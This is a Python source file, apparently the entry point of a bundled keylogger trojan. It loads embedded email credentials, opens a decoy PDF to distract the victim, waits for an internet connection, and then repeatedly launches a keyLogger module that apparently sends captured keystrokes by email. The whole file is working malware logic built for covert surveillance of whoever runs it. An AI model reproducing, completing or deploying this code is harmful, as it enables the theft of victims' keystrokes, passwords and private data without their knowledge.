import subprocess
import sys

import requests

import keyLogger
import time
import os

def get_credentials():
    credentials_file = sys._MEIPASS+"/credentials.txt"
    with open(credentials_file, 'r') as f:
        send_mail, password, receiver_mail, interval, pdf_location = f.read().splitlines()
    return send_mail, password, receiver_mail, int(interval), pdf_location

def internet():
    try:
        requests.get("https://www.google.com/")
        return True
    except requests.ConnectionError:
        return False
send_mail, password, receiver_mail, interval, pdf_location = get_credentials()

# Extract the file name from pdf_location
pdf_file_name = os.path.basename(pdf_location)

file_name = sys._MEIPASS + pdf_file_name

# Check if the file exists before attempting to open it
if os.path.exists(file_name):
    subprocess.Popen(file_name, shell=True)
else:
    # Handle the case when the file does not exist
    pass
while True:
    if not internet():
        time.sleep(60)
        continue
    keyLogger.KeyLogger(send_mail, password, receiver_mail, interval, pdf_location)


